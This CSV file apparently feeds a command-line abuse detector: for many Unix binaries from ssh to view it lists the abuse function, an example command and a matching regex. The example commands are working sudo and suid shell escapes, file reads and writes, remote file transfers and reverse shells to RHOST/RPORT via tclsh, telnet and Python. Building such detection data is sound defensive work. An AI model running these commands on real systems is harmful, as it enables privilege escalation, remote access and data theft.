"Name","Function","ExampleCode","RegexStrictV8","Notes"
"ssh","sudo","sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"sshpass","shell","sshpass /bin/sh","(?i)\b(?:\S*/)?sshpass\b.*/bin/sh",""
"sshpass","suid","./sshpass /bin/sh -p","(?i)\b(?:\S*/)?sshpass\b.*/bin/sh",""
"sshpass","sudo","sudo sshpass /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"start-stop-daemon","shell","start-stop-daemon -n $RANDOM -S -x /bin/sh","(?i)\b(?:\S*/)?start\-stop\-daemon\b.*/bin/sh",""
"start-stop-daemon","suid","./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p","(?i)\b(?:\S*/)?start\-stop\-daemon\b.*/bin/sh",""
"start-stop-daemon","sudo","sudo start-stop-daemon -n $RANDOM -S -x /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"stdbuf","shell","stdbuf -i0 /bin/sh","(?i)\b(?:\S*/)?stdbuf\b.*/bin/sh",""
"stdbuf","suid","./stdbuf -i0 /bin/sh -p","(?i)\b(?:\S*/)?stdbuf\b.*/bin/sh",""
"stdbuf","sudo","sudo stdbuf -i0 /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"strace","file-write","strace -s 999 -o $LFILE strace - DATA","(?i)\b(?:\S*/)?strace\b.*.+",""
"strace","shell","strace -o /dev/null /bin/sh","(?i)\b(?:\S*/)?strace\b.*/bin/sh",""
"strace","suid","./strace -o /dev/null /bin/sh -p","(?i)\b(?:\S*/)?strace\b.*/bin/sh",""
"strace","sudo","sudo strace -o /dev/null /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"strings","file-read","strings ""$LFILE""","(?i)\b(?:\S*/)?strings\b.*(?:""[^""]+""|\'[^\']+\')",""
"strings","suid","./strings ""$LFILE""","(?i)\b(?:\S*/)?strings\b.*(?:""[^""]+""|\'[^\']+\')",""
"strings","sudo","sudo strings ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"su","sudo","sudo su","(?i)\b(?:\S*/)?sudo\b.*.+",""
"sudo","sudo","sudo sudo /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"sysctl","command","sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)\b(?:\S*/)?sysctl\b.*(?:""[^""]+""|\'[^\']+\')",""
"sysctl","file-read","/usr/sbin/sysctl -n ""/../../$LFILE""","(?i)\b(?:\S*/)?sysctl\b.*(?:""[^""]+""|\'[^\']+\')",""
"sysctl","suid","./sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)\b(?:\S*/)?sysctl\b.*(?:""[^""]+""|\'[^\']+\')",""
"sysctl","sudo","sudo sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"systemctl","suid","echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"systemctl","sudo","echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"systemctl","sudo","echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"systemctl","sudo","sudo systemctl
!sh","(?i)\b(?:\S*/)?sudo\b.*.+",""
"systemd-resolve","sudo","sudo systemd-resolve --status
!sh","(?i)\b(?:\S*/)?sudo\b.*\-r",""
"tac","file-read","tac -s 'RANDOM' ""$LFILE""","(?i)\b(?:\S*/)?tac\b.*(?:""[^""]+""|\'[^\']+\')",""
"tac","suid","./tac -s 'RANDOM' ""$LFILE""","(?i)\b(?:\S*/)?tac\b.*(?:""[^""]+""|\'[^\']+\')",""
"tac","sudo","sudo tac -s 'RANDOM' ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"tail","file-read","tail -c1G ""$LFILE""","(?i)\b(?:\S*/)?tail\b.*\-c",""
"tail","suid","./tail -c1G ""$LFILE""","(?i)\b(?:\S*/)?tail\b.*\-c",""
"tail","sudo","sudo tail -c1G ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"tar","shell","tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh","(?i)\b(?:\S*/)?tar\b.*/bin/sh.*\-c",""
"tar","shell","tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'","(?i)\b(?:\S*/)?tar\b.*/bin/sh.*\-c",""
"tar","shell","echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"tar","file-upload","tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh","(?i)\b(?:\S*/)?tar\b.*\-c.*\-r",""
"tar","file-download","tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh","(?i)\b(?:\S*/)?tar\b.*\-c.*\-r",""
"tar","file-write","echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"tar","file-read","tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'","(?i)\b(?:\S*/)?tar\b.*/bin/sh.*\-c",""
"tar","sudo","sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"tar","limited-suid","./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh","(?i)\b(?:\S*/)?tar\b.*/bin/sh.*\-c",""
"task","shell","task execute /bin/sh","(?i)\b(?:\S*/)?task\b.*/bin/sh",""
"task","sudo","sudo task execute /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"taskset","shell","taskset 1 /bin/sh","(?i)\b(?:\S*/)?taskset\b.*/bin/sh",""
"taskset","suid","./taskset 1 /bin/sh -p","(?i)\b(?:\S*/)?taskset\b.*/bin/sh",""
"taskset","sudo","sudo taskset 1 /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"tasksh","shell","tasksh
!/bin/sh","(?i)\b(?:\S*/)?tasksh\b.*/bin/sh",""
"tasksh","limited-suid","./tasksh
!/bin/sh","(?i)\b(?:\S*/)?tasksh\b.*/bin/sh",""
"tasksh","sudo","sudo tasksh
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"tbl","file-read","tbl $LFILE","(?i)\b(?:\S*/)?tbl\b.*.+",""
"tbl","suid","./tbl $LFILE","(?i)\b(?:\S*/)?tbl\b.*.+",""
"tbl","sudo","sudo tbl $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"tclsh","shell","tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr","(?i)\b(?:\S*/)?tclsh\b.*/bin/sh",""
"tclsh","non-interactive-reverse-shell","echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh","(?i)\b(?:\S*/)?echo\b.*env\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*env\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close",""
"tclsh","suid","./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr","(?i)\b(?:\S*/)?tclsh\b.*/bin/sh",""
"tclsh","sudo","sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"tcpdump","command","echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"tcpdump","sudo","echo ""$COMMAND"" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"tdbtool","shell","tdbtool
! /bin/sh","(?i)\b(?:\S*/)?tdbtool\b.*/bin/sh",""
"tdbtool","sudo","sudo tdbtool
! /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"tdbtool","limited-suid","./tdbtool
! /bin/sh","(?i)\b(?:\S*/)?tdbtool\b.*/bin/sh",""
"tee","file-write","echo DATA | ./tee -a ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"tee","suid","echo DATA | ./tee -a ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"tee","sudo","echo DATA | sudo tee -a ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"telnet","shell","telnet $RHOST $RPORT
^]
!/bin/sh","(?i)\b(?:\S*/)?telnet\b.*/bin/sh",""
"telnet","reverse-shell","mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF","(?i)\b(?:\S*/)?mkfifo\b.*/bin/sh",""
"telnet","sudo","sudo telnet $RHOST $RPORT
^]
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"telnet","limited-suid","./telnet $RHOST $RPORT
^]
!/bin/sh","(?i)\b(?:\S*/)?telnet\b.*/bin/sh",""
"terraform","file-read","terraform console
file(""file_to_read"")","(?i)\b(?:\S*/)?terraform\b.*file\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"terraform","sudo","sudo terraform console
file(""file_to_read"")","(?i)\b(?:\S*/)?sudo\b.*file\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"terraform","suid","./terraform console
file(""file_to_read"")","(?i)\b(?:\S*/)?terraform\b.*file\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"tex","shell","tex --shell-escape '\write18{/bin/sh}\end'","(?i)\b(?:\S*/)?tex\b.*/bin/sh",""
"tex","sudo","sudo tex --shell-escape '\write18{/bin/sh}\end'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"tex","limited-suid","./tex --shell-escape '\write18{/bin/sh}\end'","(?i)\b(?:\S*/)?tex\b.*/bin/sh",""
"tftp","file-upload","tftp $RHOST
put file_to_send","(?i)\b(?:\S*/)?tftp\b.*.+",""
"tftp","file-download","tftp $RHOST
get file_to_get","(?i)\b(?:\S*/)?tftp\b.*.+",""
"tftp","suid","./tftp $RHOST
put file_to_send","(?i)\b(?:\S*/)?tftp\b.*.+",""
"tftp","sudo","sudo tftp $RHOST
put file_to_send","(?i)\b(?:\S*/)?sudo\b.*.+",""
"tic","file-read","tic -C ""$LFILE""","(?i)\b(?:\S*/)?tic\b.*\-c",""
"tic","suid","./tic -C ""$LFILE""","(?i)\b(?:\S*/)?tic\b.*\-c",""
"tic","sudo","sudo tic -C ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"time","shell","/usr/bin/time /bin/sh","(?i)\b(?:\S*/)?time\b.*/bin/sh",""
"time","suid","./time /bin/sh -p","(?i)\b(?:\S*/)?time\b.*/bin/sh",""
"time","sudo","sudo /usr/bin/time /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"timedatectl","shell","timedatectl list-timezones
!/bin/sh","(?i)\b(?:\S*/)?timedatectl\b.*/bin/sh",""
"timedatectl","sudo","sudo timedatectl list-timezones
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"timeout","shell","timeout 7d /bin/sh","(?i)\b(?:\S*/)?timeout\b.*/bin/sh",""
"timeout","suid","./timeout 7d /bin/sh -p","(?i)\b(?:\S*/)?timeout\b.*/bin/sh",""
"timeout","sudo","sudo timeout --foreground 7d /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"tmate","shell","tmate -c /bin/sh","(?i)\b(?:\S*/)?tmate\b.*/bin/sh.*\-c",""
"tmate","sudo","sudo tmate -c /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"tmate","limited-suid","./tmate -c /bin/sh","(?i)\b(?:\S*/)?tmate\b.*/bin/sh.*\-c",""
"tmux","file-read","tmux -f $LFILE","(?i)\b(?:\S*/)?tmux\b.*.+",""
"tmux","shell","tmux","(?i)\b(?:\S*/)?tmux\b.*.+",""
"tmux","shell","tmux -S /path/to/socket_name","(?i)\b(?:\S*/)?tmux\b.*.+",""
"tmux","sudo","sudo tmux","(?i)\b(?:\S*/)?sudo\b.*.+",""
"top","shell","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"top","sudo","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"torify","shell","torify /bin/sh","(?i)\b(?:\S*/)?torify\b.*/bin/sh",""
"torify","sudo","sudo torify /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"torsocks","shell","torsocks /bin/sh","(?i)\b(?:\S*/)?torsocks\b.*/bin/sh",""
"torsocks","sudo","sudo torsocks /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"troff","file-read","troff $LFILE","(?i)\b(?:\S*/)?troff\b.*.+",""
"troff","suid","./troff $LFILE","(?i)\b(?:\S*/)?troff\b.*.+",""
"troff","sudo","sudo troff $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"tshark","shell","echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF","(?i)\b(?:\S*/)?echo\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"ul","file-read","ul ""$LFILE""","(?i)\b(?:\S*/)?ul\b.*(?:""[^""]+""|\'[^\']+\')",""
"ul","suid","./ul ""$LFILE""","(?i)\b(?:\S*/)?ul\b.*(?:""[^""]+""|\'[^\']+\')",""
"ul","sudo","sudo ul ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"unexpand","file-read","unexpand -t99999999 ""$LFILE""","(?i)\b(?:\S*/)?unexpand\b.*(?:""[^""]+""|\'[^\']+\')",""
"unexpand","suid","./unexpand -t99999999 ""$LFILE""","(?i)\b(?:\S*/)?unexpand\b.*(?:""[^""]+""|\'[^\']+\')",""
"unexpand","sudo","sudo unexpand -t99999999 ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"uniq","file-read","uniq ""$LFILE""","(?i)\b(?:\S*/)?uniq\b.*(?:""[^""]+""|\'[^\']+\')",""
"uniq","suid","./uniq ""$LFILE""","(?i)\b(?:\S*/)?uniq\b.*(?:""[^""]+""|\'[^\']+\')",""
"uniq","sudo","sudo uniq ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"unshare","shell","unshare /bin/sh","(?i)\b(?:\S*/)?unshare\b.*/bin/sh",""
"unshare","suid","./unshare -r /bin/sh","(?i)\b(?:\S*/)?unshare\b.*/bin/sh.*\-r",""
"unshare","sudo","sudo unshare /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"unsquashfs","sudo","sudo unsquashfs shell
./squashfs-root/sh -p","(?i)\b(?:\S*/)?sudo\b.*\-r",""
"unsquashfs","suid","./unsquashfs shell
./squashfs-root/sh -p","(?i)\b(?:\S*/)?unsquashfs\b.*\-r",""
"unzip","sudo","sudo unzip -K shell.zip
./sh -p","(?i)\b(?:\S*/)?sudo\b.*.+",""
"unzip","suid","./unzip -K shell.zip
./sh -p","(?i)\b(?:\S*/)?unzip\b.*.+",""
"update-alternatives","sudo","echo DATA >$TF
sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"update-alternatives","suid","echo DATA >$TF
./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"uudecode","file-read","uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)\b(?:\S*/)?uuencode\b.*(?:""[^""]+""|\'[^\']+\')",""
"uudecode","suid","uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)\b(?:\S*/)?uuencode\b.*(?:""[^""]+""|\'[^\']+\')",""
"uudecode","sudo","sudo uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"uuencode","file-read","uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)\b(?:\S*/)?uuencode\b.*(?:""[^""]+""|\'[^\']+\')",""
"uuencode","suid","uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)\b(?:\S*/)?uuencode\b.*(?:""[^""]+""|\'[^\']+\')",""
"uuencode","sudo","sudo uuencode ""$LFILE"" /dev/stdout | uudecode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"vagrant","shell","cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up","(?i)\b(?:\S*/)?cd\b.*/bin/sh",""
"vagrant","sudo","cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up","(?i)\b(?:\S*/)?cd\b.*/bin/sh",""
"vagrant","suid","cd $(mktemp -d)
echo 'exec ""/bin/sh -p""' > Vagrantfile
vagrant up","(?i)\b(?:\S*/)?cd\b.*/bin/sh",""
"valgrind","shell","valgrind /bin/sh","(?i)\b(?:\S*/)?valgrind\b.*/bin/sh",""
"valgrind","sudo","sudo valgrind /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"varnishncsa","sudo","sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"varnishncsa","suid","./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","(?i)\b(?:\S*/)?varnishncsa\b.*(?:""[^""]+""|\'[^\']+\')",""
"vi","shell","vi -c ':!/bin/sh' /dev/null","(?i)\b(?:\S*/)?vi\b.*/bin/sh.*\-c",""
"vi","shell","vi
:set shell=/bin/sh
:shell","(?i)\b(?:\S*/)?vi\b.*/bin/sh",""
"vi","file-write","vi file_to_write
iDATA
^[
w","(?i)\b(?:\S*/)?vi\b.*.+",""
"vi","file-read","vi file_to_read","(?i)\b(?:\S*/)?vi\b.*.+",""
"vi","sudo","sudo vi -c ':!/bin/sh' /dev/null","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"view","shell","view -c ':!/bin/sh'","(?i)\b(?:\S*/)?view\b.*/bin/sh.*\-c",""
"view","shell","view
:set shell=/bin/sh
:shell","(?i)\b(?:\S*/)?view\b.*/bin/sh",""
"view","shell","view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","(?i)\b(?:\S*/)?view\b.*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"view","shell","view -c ':lua os.execute(""reset; exec sh"")'","(?i)\b(?:\S*/)?view\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"view","reverse-shell","view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)\b(?:\S*/)?view\b.*socket\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*connect\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*int\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*dup2\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*in\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*spawn\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*command\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
